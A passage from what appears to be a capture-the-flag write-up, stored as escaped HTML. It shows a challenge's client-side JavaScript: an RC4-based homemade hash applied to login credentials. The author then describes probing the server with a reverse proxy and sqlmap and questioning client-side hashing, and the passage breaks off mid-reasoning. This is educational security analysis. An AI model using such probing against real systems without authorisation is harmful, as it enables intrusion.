class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003estream\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eox\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eox\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efromCharCode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eox\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex01\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex00\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efromCharCode\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xFF\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubstring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ej\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ej\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e^=\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ehs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ehs\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efromCharCode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ehs\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003efhash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e0\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehash\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efhash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eusername\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex05\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e0\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s1\"\u003ex06\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epassword\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eform\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is a crappy hash function based on multiple rounds of the RC4 stream cipher, where the key is the input data. However, I could not find any obvious flaws that while playing with this function. Instead, let\u0026#39;s play with the server and see if we can do anything interesting.\u003c/p\u003e\n\n\u003cp\u003eAs before, I implemented another reverse proxy; however, this proved to not be useful as Sqlmap didn\u0026#39;t find any vulnerabilities. Plus, why would there be 2 SQLi challenges in a row? Taking a step back, one particular thing that bothered me was that we were authenticating using a hash, rather than username and password credentials. Why bother sending a hash? And if it\u0026#39;s only hashed client-side, that defeats the purpose of hashing anyways, since if the hashes are ever stolen, you can break into people\u0026#39;s accounts.\u003c/p\u003e\n\n\u003cp\u003eHere is the intuition I had: First, assume the application is exploitable. If the problem 